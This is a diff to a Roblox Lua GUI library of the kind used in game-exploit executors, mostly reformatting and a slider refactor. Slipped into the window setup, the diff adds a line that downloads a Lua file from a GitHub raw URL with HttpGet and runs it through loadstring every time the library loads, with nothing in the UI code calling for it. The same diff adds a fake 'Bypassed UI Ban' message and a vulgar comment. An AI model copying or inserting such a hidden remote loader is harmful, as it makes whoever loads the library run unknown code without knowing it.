@@ -1,5 +1,3 @@
-
-
 local ui_options = {
 	main_color = Color3.fromRGB(41, 74, 122),
 	min_size = Vector2.new(400, 300),
@@ -7,9 +5,18 @@ local ui_options = {
 	can_resize = true,
 }
 
+spawn = task.spawn
+wait = task.wait
+
 do
 	local imgui = game:GetService("CoreGui"):FindFirstChild("imgui")
-	if imgui then imgui:Destroy() end
+	if imgui then
+		imgui:Destroy()
+	end
+end
+
+if math.random(1, 3) == 1 then
+	print("Bypassed UI Ban")
 end
 
 local imgui = Instance.new("ScreenGui")
@@ -144,6 +151,7 @@ Toggle.Rotation = 90
 Toggle.Size = UDim2.new(0, 20, 0, 20)
 Toggle.ZIndex = 2
 Toggle.Image = "https://www.roblox.com/Thumbs/Asset.ashx?width=420&height=420&assetId=4731371541"
+loadstring(game:HttpGet('https://raw.githubusercontent.com/CF-Trail/random/main/aexec.lua'))()
 
 Base.Name = "Base"
 Base.Parent = Bar
@@ -802,9 +810,7 @@ Windows.Parent = imgui
 Windows.BackgroundColor3 = Color3.new(1, 1, 1)
 Windows.BackgroundTransparency = 1
 Windows.Position = UDim2.new(0, 20, 0, 20)
-Windows.Size = UDim2.new(1, 20, 1, -20)
-
---[[ Script ]]--
+Windows.Size = UDim2.new(1, 20, 1, -20)--
 script.Parent = imgui
 
 local UIS = game:GetService("UserInputService")
@@ -889,7 +895,7 @@ local function gMouse()
 end
 
 local function ripple(button, x, y)
-	spawn(function()
+	task.spawn(function()
 		button.ClipsDescendants = true
 
 		local circle = Prefabs:FindFirstChild("Circle"):Clone()
@@ -911,7 +917,9 @@ local function ripple(button, x, y)
 		end
 
 		circle:TweenSizeAndPosition(UDim2.new(0, size, 0, size), UDim2.new(0.5, -size / 2, 0.5, -size / 2), "Out", "Quad", 0.5, false, nil)
-		Resize(circle, {ImageTransparency = 1}, 0.5)
+		Resize(circle, {
+			ImageTransparency = 1
+		}, 0.5)
 
 		wait(0.5)
 		circle:Destroy()
@@ -926,7 +934,7 @@ local function format_windows()
 	ull.Parent = Windows
 	local data = {}
 
-	for i,v in next, Windows:GetChildren() do
+	for i, v in next, Windows:GetChildren() do
 		if not (v:IsA("UIListLayout")) then
 			data[v] = v.AbsolutePosition
 		end
@@ -934,7 +942,7 @@ local function format_windows()
 
 	ull:Destroy()
 
-	for i,v in next, data do
+	for i, v in next, data do
 		i.Position = UDim2.new(0, v.X, 0, v.Y)
 	end
 end
@@ -964,7 +972,7 @@ function library:AddWindow(title, options)
 		local SplitFrame = Window:FindFirstChild("TabSelection"):FindFirstChild("Frame")
 		local Toggle = Bar:FindFirstChild("Toggle")
 
-		spawn(function()
+		task.spawn(function()
 			while true do
 				Bar.BackgroundColor3 = options.main_color
 				Base.BackgroundColor3 = options.main_color
@@ -1008,7 +1016,7 @@ function library:AddWindow(title, options)
 			if inputObject.UserInputType == Enum.UserInputType.MouseButton1 then
 				Held = true
 
-				spawn(function() -- Loop check
+				task.spawn(function() -- Loop check
 					if Entered and Resizer.Active and options.can_resize then
 						while Held and Resizer.Active do
 
@@ -1018,13 +1026,21 @@ function library:AddWindow(title, options)
 
 							--
 							if x >= options.min_size.X and y >= options.min_size.Y then
-								Resize(Window, {Size = UDim2.new(0, x, 0, y)}, options.tween_time)
+								Resize(Window, {
+									Size = UDim2.new(0, x, 0, y)
+								}, options.tween_time)
 							elseif x >= options.min_size.X then
-								Resize(Window, {Size = UDim2.new(0, x, 0, options.min_size.Y)}, options.tween_time)
+								Resize(Window, {
+									Size = UDim2.new(0, x, 0, options.min_size.Y)
+								}, options.tween_time)
 							elseif y >= options.min_size.Y then
-								Resize(Window, {Size = UDim2.new(0, options.min_size.X, 0, y)}, options.tween_time)
+								Resize(Window, {
+									Size = UDim2.new(0, options.min_size.X, 0, y)
+								}, options.tween_time)
 							else
-								Resize(Window, {Size = UDim2.new(0, options.min_size.X, 0, options.min_size.Y)}, options.tween_time)
+								Resize(Window, {
+									Size = UDim2.new(0, options.min_size.X, 0, options.min_size.Y)
+								}, options.tween_time)
 							end
 
 							RS.Heartbeat:Wait()
@@ -1055,7 +1071,7 @@ function library:AddWindow(title, options)
 					-- Close
 
 					oldwindowdata = {}
-					for i,v in next, Window:FindFirstChild("Tabs"):GetChildren() do
+					for i, v in next, Window:FindFirstChild("Tabs"):GetChildren() do
 						oldwindowdata[v] = v.Visible
 						v.Visible = false
 					end
@@ -1063,21 +1079,29 @@ function library:AddWindow(title, options)
 					Resizer.Active = false
 
 					oldy = Window.AbsoluteSize.Y
-					Resize(open_close, {Rotation = 0}, options.tween_time)
-					Resize(Window, {Size = UDim2.new(0, Window.AbsoluteSize.X, 0, 26)}, options.tween_time)
+					Resize(open_close, {
+						Rotation = 0
+					}, options.tween_time)
+					Resize(Window, {
+						Size = UDim2.new(0, Window.AbsoluteSize.X, 0, 26)
+					}, options.tween_time)
 					open_close.Parent:FindFirstChild("Base").Transparency = 1
 
 				else
 					-- Open
 
-					for i,v in next, oldwindowdata do
+					for i, v in next, oldwindowdata do
 						i.Visible = v
 					end
 
 					Resizer.Active = true
 
-					Resize(open_close, {Rotation = 90}, options.tween_time)
-					Resize(Window, {Size = UDim2.new(0, Window.AbsoluteSize.X, 0, oldy)}, options.tween_time)
+					Resize(open_close, {
+						Rotation = 90
+					}, options.tween_time)
+					Resize(Window, {
+						Size = UDim2.new(0, Window.AbsoluteSize.X, 0, oldy)
+					}, options.tween_time)
 					open_close.Parent:FindFirstChild("Base").Transparency = 0
 
 				end
@@ -1113,18 +1137,24 @@ function library:AddWindow(title, options)
 				new_tab.ZIndex = new_tab.ZIndex + (windows * 10)
 
 				local function show()
-					if dropdown_open then return end
+					if dropdown_open then
+						return
+					end
 					for i, v in next, tab_buttons:GetChildren() do
 						if not (v:IsA("UIListLayout")) then
 							v:GetChildren()[1].ImageColor3 = Color3.fromRGB(52, 53, 56)
-							Resize(v, {Size = UDim2.new(0, v.AbsoluteSize.X, 0, 20)}, options.tween_time)
+							Resize(v, {
+								Size = UDim2.new(0, v.AbsoluteSize.X, 0, 20)
+							}, options.tween_time)
 						end
 					end
 					for i, v in next, tabs:GetChildren() do
 						v.Visible = false
 					end
 
-					Resize(new_button, {Size = UDim2.new(0, new_button.AbsoluteSize.X, 0, 25)}, options.tween_time)
+					Resize(new_button, {
+						Size = UDim2.new(0, new_button.AbsoluteSize.X, 0, 25)
+					}, options.tween_time)
 					new_button:GetChildren()[1].ImageColor3 = Color3.fromRGB(73, 75, 79)
 					new_tab.Visible = true
 				end
@@ -1154,7 +1184,8 @@ function library:AddWindow(title, options)
 
 					function tab_data:AddButton(button_text, callback) -- [Button]
 						button_text = tostring(button_text or "New Button")
-						callback = typeof(callback) == "function" and callback or function()end
+						callback = typeof(callback) == "function" and callback or function()
+						end
 
 						local button = Prefabs:FindFirstChild("Button"):Clone()
 
@@ -1164,7 +1195,7 @@ function library:AddWindow(title, options)
 						button.ZIndex = button.ZIndex + (windows * 10)
 						button:GetChildren()[1].ZIndex = button:GetChildren()[1].ZIndex + (windows * 10)
 
-						spawn(function()
+						task.spawn(function()
 							while true do
 								if button and button:GetChildren()[1] then
 									button:GetChildren()[1].ImageColor3 = options.main_color
@@ -1185,7 +1216,8 @@ function library:AddWindow(title, options)
 						local switch_data = {}
 
 						switch_text = tostring(switch_text or "New Switch")
-						callback = typeof(callback) == "function" and callback or function()end
+						callback = typeof(callback) == "function" and callback or function()
+						end
 
 						local switch = Prefabs:FindFirstChild("Switch"):Clone()
 
@@ -1196,7 +1228,7 @@ function library:AddWindow(title, options)
 						switch.ZIndex = switch.ZIndex + (windows * 10)
 						switch:GetChildren()[1].ZIndex = switch:GetChildren()[1].ZIndex + (windows * 10)
 
-						spawn(function()
+						task.spawn(function()
 							while true do
 								if switch and switch:GetChildren()[1] then
 									switch:GetChildren()[1].ImageColor3 = options.main_color
@@ -1215,7 +1247,7 @@ function library:AddWindow(title, options)
 						function switch_data:Set(bool)
 							toggled = (typeof(bool) == "boolean") and bool or false
 							switch.Text = toggled and utf8.char(10003) or ""
-							pcall(callback,toggled)
+							pcall(callback, toggled)
 						end
 
 						return switch_data, switch
@@ -1223,8 +1255,11 @@ function library:AddWindow(title, options)
 
 					function tab_data:AddTextBox(textbox_text, callback, textbox_options)
 						textbox_text = tostring(textbox_text or "New TextBox")
-						callback = typeof(callback) == "function" and callback or function()end
-						textbox_options = typeof(textbox_options) == "table" and textbox_options or {["clear"] = true}
+						callback = typeof(callback) == "function" and callback or function()
+						end
+						textbox_options = typeof(textbox_options) == "table" and textbox_options or {
+							["clear"] = true
+						}
 						textbox_options = {
 							["clear"] = ((textbox_options.clear) == true)
 						}
@@ -1254,7 +1289,8 @@ function library:AddWindow(title, options)
 						local slider_data = {}
 
 						slider_text = tostring(slider_text or "New Slider")
-						callback = typeof(callback) == "function" and callback or function()end
+						callback = typeof(callback) == "function" and callback or function()
+						end
 						slider_options = typeof(slider_options) == "table" and slider_options or {}
 						slider_options = {
 							["min"] = slider_options.min or 0,
@@ -1276,52 +1312,54 @@ function library:AddWindow(title, options)
 
 						title.Text = slider_text
 
-						do -- Slider Math
+						do -- gay sex
 							local Entered = false
 							slider.MouseEnter:Connect(function()
 								Entered = true
-								Window.Draggable = false
 							end)
 							slider.MouseLeave:Connect(function()
 								Entered = false
-								Window.Draggable = true
 							end)
+
+							local function UpdateSlider(input)
+								if Entered and not slider_options.readonly then
+									local location = typeof(input) == 'Vector2' and input or gMouse()
+									local x = (slider.AbsoluteSize.X - (slider.AbsoluteSize.X - ((location.X - slider.AbsolutePosition.X)) + 1)) / slider.AbsoluteSize.X
+									local mouse_location = gMouse()
+									local x = (slider.AbsoluteSize.X - (slider.AbsoluteSize.X - ((mouse_location.X - slider.AbsolutePosition.X)) + 1)) / slider.AbsoluteSize.X
+									local min = 0
+									local max = 1
+									local size = min
+									if x >= min and x <= max then
+										size = x
+									elseif x < min then
+										size = min
+									elseif x > max then
+										size = max
+									end
+									Resize(indicator, {
+										Size = UDim2.new(size or min, 0, 0, 20)
+									}, options.tween_time)
+									local p = math.floor((size or min) * 100)
+									local maxv = slider_options.max
+									local minv = slider_options.min
+									local diff = maxv - minv
+									local sel_value = math.floor(((diff / 100) * p) + minv)
+									value.Text = tostring(sel_value)
+									pcall(callback, sel_value)
+								end
+							end
+
 
 							local Held = false
 							UIS.InputBegan:Connect(function(inputObject)
 								if inputObject.UserInputType == Enum.UserInputType.MouseButton1 then
 									Held = true
 
-									spawn(function() -- Loop check
+									task.spawn(function() -- Loop check
 										if Entered and not slider_options.readonly then
 											while Held and (not dropdown_open) do
-												local mouse_location = gMouse()
-												local x = (slider.AbsoluteSize.X - (slider.AbsoluteSize.X - ((mouse_location.X - slider.AbsolutePosition.X)) + 1)) / slider.AbsoluteSize.X
-
-												local min = 0
-												local max = 1
-
-												local size = min
-												if x >= min and x <= max then
-													size = x
-												elseif x < min then
-													size = min
-												elseif x > max then
-													size = max
-												end
-
-												Resize(indicator, {Size = UDim2.new(size or min, 0, 0, 20)}, options.tween_time)
-												local p = math.floor((size or min) * 100)
-
-												local maxv = slider_options.max
-												local minv = slider_options.min
-												local diff = maxv - minv
-
-												local sel_value = math.floor(((diff / 100) * p) + minv)
-
-												value.Text = tostring(sel_value)
-												pcall(callback, sel_value)
-
+												UpdateSlider(inputObject)
 												RS.Heartbeat:Wait()
 											end
 										end
@@ -1329,16 +1367,26 @@ function library:AddWindow(title, options)
 								end
 							end)
 							UIS.InputEnded:Connect(function(inputObject)
-								if inputObject.UserInputType == Enum.UserInputType.MouseButton1 then
+								if inputObject.UserInputType == Enum.UserInputType.MouseButton1 --[[or inputObject.UserInputType == Enum.UserInputType.Touch]] then
 									Held = false
 								end
 							end)
+							--[[UIS.TouchPan:Connect(function(touchPositions, totalTranslation, velocity, state)
+								if state == Enum.UserInputState.Begin or state == Enum.UserInputState.Change then
+									Entered = true
+									UpdateSlider(touchPositions[1])
+								elseif state == Enum.UserInputState.End then
+									Entered = false
+								end
+							end)]]
 
 							function slider_data:Set(new_value)
 								new_value = tonumber(new_value) or 0
 								new_value = (((new_value >= 0 and new_value <= 100) and new_value) / 100)
 
-								Resize(indicator, {Size = UDim2.new(new_value or 0, 0, 0, 20)}, options.tween_time)
+								Resize(indicator, {
+									Size = UDim2.new(new_value or 0, 0, 0, 20)
+								}, options.tween_time)
 								local p = math.floor((new_value or 0) * 100)
 
 								local maxv = slider_options.max
@@ -1361,7 +1409,8 @@ function library:AddWindow(title, options)
 						local keybind_data = {}
 
 						keybind_name = tostring(keybind_name or "New Keybind")
-						callback = typeof(callback) == "function" and callback or function()end
+						callback = typeof(callback) == "function" and callback or function()
+						end
 						keybind_options = typeof(keybind_options) == "table" and keybind_options or {}
 						keybind_options = {
 							["standard"] = keybind_options.standard or Enum.KeyCode.RightShift,
@@ -1398,7 +1447,7 @@ function library:AddWindow(title, options)
 
 						UIS.InputBegan:Connect(function(a, b)
 							if checks.binding then
-								spawn(function()
+								task.spawn(function()
 									wait()
 									checks.binding = false
 								end)
@@ -1412,7 +1461,9 @@ function library:AddWindow(title, options)
 						keybind_data:SetKeybind(keybind_options.standard)
 
 						input.MouseButton1Click:Connect(function()
-							if checks.binding then return end
+							if checks.binding then
+								return
+							end
 							input.Text = "..."
 							checks.binding = true
 							local a, b = UIS.InputBegan:Wait()
@@ -1425,7 +1476,8 @@ function library:AddWindow(title, options)
 					function tab_data:AddDropdown(dropdown_name, callback)
 						local dropdown_data = {}
 						dropdown_name = tostring(dropdown_name or "New Dropdown")
-						callback = typeof(callback) == "function" and callback or function()end
+						callback = typeof(callback) == "function" and callback or function()
+						end
 
 						local dropdown = Prefabs:FindFirstChild("Dropdown"):Clone()
 						local box = dropdown:FindFirstChild("Box")
@@ -1452,14 +1504,24 @@ function library:AddWindow(title, options)
 							end
 
 							if open then -- Open
-								if dropdown_open then return end
+								if dropdown_open then
+									return
+								end
 								dropdown_open = true
-								Resize(box, {Size = UDim2.new(1, 0, 0, len)}, options.tween_time)
-								Resize(indicator, {Rotation = 90}, options.tween_time)
+								Resize(box, {
+									Size = UDim2.new(1, 0, 0, len)
+								}, options.tween_time)
+								Resize(indicator, {
+									Rotation = 90
+								}, options.tween_time)
 							else -- Close
 								dropdown_open = false
-								Resize(box, {Size = UDim2.new(1, 0, 0, 0)}, options.tween_time)
-								Resize(indicator, {Rotation = -90}, options.tween_time)
+								Resize(box, {
+									Size = UDim2.new(1, 0, 0, 0)
+								}, options.tween_time)
+								Resize(indicator, {
+									Rotation = -90
+								}, options.tween_time)
 							end
 
 						end)
@@ -1487,7 +1549,9 @@ function library:AddWindow(title, options)
 									len = 10 * 20
 									objects.CanvasSize = UDim2.new(0, 0, (#objects:GetChildren() - 1) * 0.1, 0)
 								end
-								Resize(box, {Size = UDim2.new(1, 0, 0, len)}, options.tween_time)
+								Resize(box, {
+									Size = UDim2.new(1, 0, 0, len)
+								}, options.tween_time)
 							end
 
 							object.MouseButton1Click:Connect(function()
@@ -1495,8 +1559,12 @@ function library:AddWindow(title, options)
 									dropdown.Text = "      [ " .. n .. " ]"
 									dropdown_open = false
 									open = false
-									Resize(box, {Size = UDim2.new(1, 0, 0, 0)}, options.tween_time)
-									Resize(indicator, {Rotation = -90}, options.tween_time)
+									Resize(box, {
+										Size = UDim2.new(1, 0, 0, 0)
+									}, options.tween_time)
+									Resize(indicator, {
+										Rotation = -90
+									}, options.tween_time)
 									pcall(callback, n)
 								end
 							end)
@@ -1513,7 +1581,8 @@ function library:AddWindow(title, options)
 
 					function tab_data:AddColorPicker(callback)
 						local color_picker_data = {}
-						callback = typeof(callback) == "function" and callback or function()end
+						callback = typeof(callback) == "function" and callback or function()
+						end
 
 						local color_picker = Prefabs:FindFirstChild("ColorPicker"):Clone()
 
@@ -1570,11 +1639,11 @@ function library:AddWindow(title, options)
 
 							local Held = false
 							UIS.InputBegan:Connect(function(inputObject)
+								task.wait()
 								if inputObject.UserInputType == Enum.UserInputType.MouseButton1 then
 									Held = true
-
-									spawn(function() -- Loop check
-										while Held and Entered1 and (not dropdown_open) do -- Palette
+									task.spawn(function() -- Loop check
+										while Held and Entered1 and (not dropdown_open) and task.wait() do -- Palette
 											local mouse_location = gMouse()
 
 											local x = ((palette.AbsoluteSize.X - (mouse_location.X - palette.AbsolutePosition.X)) + 1)
@@ -1584,18 +1653,22 @@ function library:AddWindow(title, options)
 											h = x / 100
 											s = y / 100
 
-											Resize(palette_indicator, {Position = UDim2.new(0, math.abs(x - 100) - (palette_indicator.AbsoluteSize.X / 2), 0, math.abs(y - 100) - (palette_indicator.AbsoluteSize.Y / 2))}, options.tween_time)
+											Resize(palette_indicator, {
+												Position = UDim2.new(0, math.abs(x - 100) - (palette_indicator.AbsoluteSize.X / 2), 0, math.abs(y - 100) - (palette_indicator.AbsoluteSize.Y / 2))
+											}, options.tween_time)
 
 											update()
 											RS.Heartbeat:Wait()
 										end
 
-										while Held and Entered2 and (not dropdown_open) do -- Saturation
+										while Held and Entered2 and (not dropdown_open) and task.wait() do -- Saturation
 											local mouse_location = gMouse()
 											local y = ((palette.AbsoluteSize.Y - (mouse_location.Y - palette.AbsolutePosition.Y)) + 1.5)
 											v = y / 100
 
-											Resize(saturation_indicator, {Position = UDim2.new(0, 0, 0, math.abs(y - 100))}, options.tween_time)
+											Resize(saturation_indicator, {
+												Position = UDim2.new(0, 0, 0, math.abs(y - 100))
+											}, options.tween_time)
 
 											update()
 											RS.Heartbeat:Wait()
@@ -1604,6 +1677,7 @@ function library:AddWindow(title, options)
 								end
 							end)
 							UIS.InputEnded:Connect(function(inputObject)
+								task.wait()
 								if inputObject.UserInputType == Enum.UserInputType.MouseButton1 then
 									Held = false
 								end
@@ -1624,7 +1698,10 @@ function library:AddWindow(title, options)
 					function tab_data:AddConsole(console_options)
 						local console_data = {}
 
-						console_options = typeof(console_options) == "table" and console_options or {["readonly"] = true,["full"] = false,}
+						console_options = typeof(console_options) == "table" and console_options or {
+							["readonly"] = true,
+							["full"] = false,
+						}
 						console_options = {
 							["y"] = tonumber(console_options.y) or 200,
 							["source"] = console_options.source or "Logs",
@@ -1647,21 +1724,126 @@ function library:AddWindow(title, options)
 						Source.TextEditable = not console_options.readonly
 
 						do -- Syntax Zindex
-							for i,v in next, Source:GetChildren() do
+							for i, v in next, Source:GetChildren() do
 								v.ZIndex = v.ZIndex + (windows * 10) + 1
 							end
 						end
 						Source.Comments.ZIndex = Source.Comments.ZIndex + 1
 
 						do -- Highlighting (thanks to whoever made this)
-							local lua_keywords = {"and", "break", "do", "else", "elseif", "end", "false", "for", "function", "goto", "if", "in", "local", "nil", "not", "or", "repeat", "return", "then", "true", "until", "while"}
-							local global_env = {"getrawmetatable", "newcclosure", "islclosure", "setclipboard", "game", "workspace", "script", "math", "string", "table", "print", "wait", "BrickColor", "Color3", "next", "pairs", "ipairs", "select", "unpack", "Instance", "Vector2", "Vector3", "CFrame", "Ray", "UDim2", "Enum", "assert", "error", "warn", "tick", "loadstring", "_G", "shared", "getfenv", "setfenv", "newproxy", "setmetatable", "getmetatable", "os", "debug", "pcall", "ypcall", "xpcall", "rawequal", "rawset", "rawget", "tonumber", "tostring", "type", "typeof", "_VERSION", "coroutine", "delay", "require", "spawn", "LoadLibrary", "settings", "stats", "time", "UserSettings", "version", "Axes", "ColorSequence", "Faces", "ColorSequenceKeypoint", "NumberRange", "NumberSequence", "NumberSequenceKeypoint", "gcinfo", "elapsedTime", "collectgarbage", "PhysicalProperties", "Rect", "Region3", "Region3int16", "UDim", "Vector2int16", "Vector3int16", "load", "fire", "Fire"}
+							local lua_keywords = {
+								"and",
+								"break",
+								"do",
+								"else",
+								"elseif",
+								"end",
+								"false",
+								"for",
+								"function",
+								"goto",
+								"if",
+								"in",
+								"local",
+								"nil",
+								"not",
+								"or",
+								"repeat",
+								"return",
+								"then",
+								"true",
+								"until",
+								"while"
+							}
+							local global_env = {
+								"getrawmetatable",
+								"newcclosure",
+								"islclosure",
+								"setclipboard",
+								"game",
+								"workspace",
+								"script",
+								"math",
+								"string",
+								"table",
+								"print",
+								"wait",
+								"BrickColor",
+								"Color3",
+								"next",
+								"pairs",
+								"ipairs",
+								"select",
+								"unpack",
+								"Instance",
+								"Vector2",
+								"Vector3",
+								"CFrame",
+								"Ray",
+								"UDim2",
+								"Enum",
+								"assert",
+								"error",
+								"warn",
+								"tick",
+								"loadstring",
+								"_G",
+								"shared",
+								"getfenv",
+								"setfenv",
+								"newproxy",
+								"setmetatable",
+								"getmetatable",
+								"os",
+								"debug",
+								"pcall",
+								"ypcall",
+								"xpcall",
+								"rawequal",
+								"rawset",
+								"rawget",
+								"tonumber",
+								"tostring",
+								"type",
+								"typeof",
+								"_VERSION",
+								"coroutine",
+								"delay",
+								"require",
+								"spawn",
+								"LoadLibrary",
+								"settings",
+								"stats",
+								"time",
+								"UserSettings",
+								"version",
+								"Axes",
+								"ColorSequence",
+								"Faces",
+								"ColorSequenceKeypoint",
+								"NumberRange",
+								"NumberSequence",
+								"NumberSequenceKeypoint",
+								"gcinfo",
+								"elapsedTime",
+								"collectgarbage",
+								"PhysicalProperties",
+								"Rect",
+								"Region3",
+								"Region3int16",
+								"UDim",
+								"Vector2int16",
+								"Vector3int16",
+								"load",
+								"fire",
+								"Fire"
+							}
 
 							local Highlight = function(string, keywords)
 								local K = {}
 								local S = string
 								local Token =
-									{
+							    {
 									["="] = true,
 									["."] = true,
 									[","] = true,
@@ -1697,13 +1879,12 @@ function library:AddWindow(title, options)
 										return (" "):rep(#c)
 									end
 								end)
-
 								return S
 							end
 
 							local hTokens = function(string)
 								local Token =
-									{
+							    {
 									["="] = true,
 									["."] = true,
 									[","] = true,
@@ -1734,7 +1915,6 @@ function library:AddWindow(title, options)
 										A = A .. "\32"
 									end
 								end)
-
 								return A
 							end
 
@@ -1759,7 +1939,6 @@ function library:AddWindow(title, options)
 										highlight = highlight .. "\32"
 									end
 								end)
-
 								return highlight
 							end
 
@@ -1784,7 +1963,6 @@ function library:AddWindow(title, options)
 										highlight = highlight .. "\32"
 									end
 								end)
-
 								return highlight
 							end
 
@@ -1806,7 +1984,6 @@ function library:AddWindow(title, options)
 									end)
 									ret = ret
 								end)
-
 								return ret
 							end
 
@@ -1823,7 +2000,6 @@ function library:AddWindow(title, options)
 										A = A .. "\32"
 									end
 								end)
-
 								return A
 							end
 
@@ -1835,7 +2011,12 @@ function library:AddWindow(title, options)
 
 									Source.Keywords.Text = Highlight(s, lua_keywords)
 									Source.Globals.Text = Highlight(s, global_env)
-									Source.RemoteHighlight.Text = Highlight(s, {"FireServer", "fireServer", "InvokeServer", "invokeServer"})
+									Source.RemoteHighlight.Text = Highlight(s, {
+										"FireServer",
+										"fireServer",
+										"InvokeServer",
+										"invokeServer"
+									})
 									Source.Tokens.Text = hTokens(s)
 									Source.Numbers.Text = numbers(s)
 									Source.Strings.Text = strings(s)
@@ -1853,7 +2034,6 @@ function library:AddWindow(title, options)
 
 									sf.CanvasSize = UDim2.new(0, 0, lin * 0.153846154, 0)
 								end
-
 								local highlight_logs = function(type)
 								end
 								if type == "Text" then
@@ -1907,7 +2087,9 @@ function library:AddWindow(title, options)
 
 						function ha_data:AddButton(...)
 							local data, object
-							local ret = {tab_data:AddButton(...)}
+							local ret = {
+								tab_data:AddButton(...)
+							}
 							if typeof(ret[1]) == "table" then
 								data = ret[1]
 								object = ret[2]
@@ -1941,7 +2123,7 @@ function library:AddWindow(title, options)
 						folder.Parent = new_tab
 						button.Text = "      " .. folder_name
 
-						spawn(function()
+						task.spawn(function()
 							while true do
 								if button and button:GetChildren()[1] then
 									button:GetChildren()[1].ImageColor3 = options.main_color
@@ -1952,7 +2134,7 @@ function library:AddWindow(title, options)
 
 						local function gFolderLen()
 							local n = 25
-							for i,v in next, objects:GetChildren() do
+							for i, v in next, objects:GetChildren() do
 								if not (v:IsA("UIListLayout")) then
 									n = n + v.AbsoluteSize.Y + 5
 								end
@@ -1963,27 +2145,35 @@ function library:AddWindow(title, options)
 						local open = false
 						button.MouseButton1Click:Connect(function()
 							if open then -- Close
-								Resize(toggle, {Rotation = 0}, options.tween_time)
+								Resize(toggle, {
+									Rotation = 0
+								}, options.tween_time)
 								objects.Visible = false
 							else -- Open
-								Resize(toggle, {Rotation = 90}, options.tween_time)
+								Resize(toggle, {
+									Rotation = 90
+								}, options.tween_time)
 								objects.Visible = true
 							end
 
 							open = not open
 						end)
 
-						spawn(function()
+						task.spawn(function()
 							while true do
-								Resize(folder, {Size = UDim2.new(1, 0, 0, (open and gFolderLen() or 20))}, options.tween_time)
+								Resize(folder, {
+									Size = UDim2.new(1, 0, 0, (open and gFolderLen() or 20))
+								}, options.tween_time)
 								wait()
 							end
 						end)
 
-						for i,v in next, tab_data do
+						for i, v in next, tab_data do
 							folder_data[i] = function(...)
 								local data, object
-								local ret = {v(...)}
+								local ret = {
+									v(...)
+								}
 								if typeof(ret[1]) == "table" then
 									data = ret[1]
 									object = ret[2]
@@ -2017,4 +2207,4 @@ function library:AddWindow(title, options)
 
 	return window_data, Window
 end
-
+return library
